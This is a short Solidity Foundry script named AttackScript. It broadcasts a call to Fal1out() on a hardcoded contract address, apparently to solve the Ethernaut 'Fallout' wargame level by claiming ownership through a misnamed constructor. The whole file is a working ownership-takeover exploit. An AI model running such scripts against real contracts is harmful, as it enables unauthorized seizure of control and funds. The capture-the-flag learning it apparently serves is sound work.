// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    address victim;

    constructor() {
        victim = 0x020a2877Faa90B8f04f383e17E84144dBD572014;
    }

    function run() external {
        vm.startBroadcast();
        (bool success, ) = victim.call{value: 0}(
            abi.encodeWithSignature("Fal1out()")
        );
        vm.stopBroadcast();
    }
}
